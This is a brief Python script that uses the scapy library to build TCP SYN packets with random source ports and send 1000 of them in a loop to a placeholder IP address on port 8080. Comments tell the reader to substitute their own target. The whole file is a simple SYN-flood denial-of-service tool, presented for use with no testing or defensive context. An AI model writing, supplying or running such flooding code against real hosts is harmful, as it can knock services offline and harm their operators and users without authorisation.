from scapy.all import *

def send_syn_packet(target_ip, target_port):
    # Create IP layer
    ip = IP(dst=target_ip)

    # Create TCP layer with SYN flag
    tcp = TCP(sport=RandShort(), dport=target_port, flags='S')

    # Combine IP and TCP layers
    packet = ip/tcp

    # Send the packet
    send(packet, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.XXX"  # Replace with the target IP
    target_port = 8080            # Replace with the target port (e.g., HTTP)
    
    for a in range(1000):
        send_syn_packet(target_ip, target_port)

